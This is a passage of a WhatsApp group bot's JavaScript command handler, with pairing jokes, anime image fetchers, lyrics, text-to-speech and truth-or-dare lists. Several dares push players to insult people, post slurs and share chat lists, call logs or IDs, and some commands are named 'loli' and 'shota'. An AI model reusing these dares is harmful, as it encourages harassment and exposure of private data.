cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
nyanBot2.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) return StickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
nyanBot2.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./Media/theme/nyancat.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return StickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
nyanBot2.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./Media/theme/nyancat.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
                        case 'coffee': case 'kopi': {
                nyanBot2.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return reply('Enter Query Title')
                await StickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                nyanBot2.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return reply('Enter Query Title')
                await StickWait()
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                nyanBot2.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      nyanBot2.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      nyanBot2.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
            case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      nyanBot2.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await StickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
nyanBot2.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'lyrics': {
if (!text) return reply(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
await StickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
reply(`
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim())
}
break
case 'pick': {
            	if (!m.isGroup) return StickGroup()
            	if (!text) return reply(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await nyanBot2.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let xeonshimts = member[Math.floor(Math.random() * member.length)]
             nyanBot2.sendMessage(from, { 
text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[xeonshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./Media/theme/nyancat.jpg`),
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }
     break
     case 'say': case 'tts': case 'gtts':{
if (!text) return reply('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return nyanBot2.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return reply(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }
    break
    case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return reply(textquotes)
break
case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              nyanBot2.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              nyanBot2.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break
              case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
nyanBot2.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
nyanBot2.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'animeawoo':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animemegumin':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeshinobu':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehandhold':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehighfive':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecringe':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animedance':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehappy':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeglomp':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmug':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
